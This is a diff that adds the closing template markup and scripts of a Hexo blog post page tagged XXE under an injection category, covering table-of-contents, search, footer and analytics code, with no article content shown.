+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B3%A8%E5%85%A5/" class="post-category">
+                                    注入
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/XXE/">
+                        <span class="chip bg-color">XXE</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('100')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Lees&#39;s Blog<br />'
+            + '文章作者: Lees<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2022</span>
+            
+            <a href="/about" target="_blank">Lees</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">19.7k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2021";
+                        var startMonth = "9";
+                        var startDate = "5";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:lees01@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2578546966" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2578546966" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
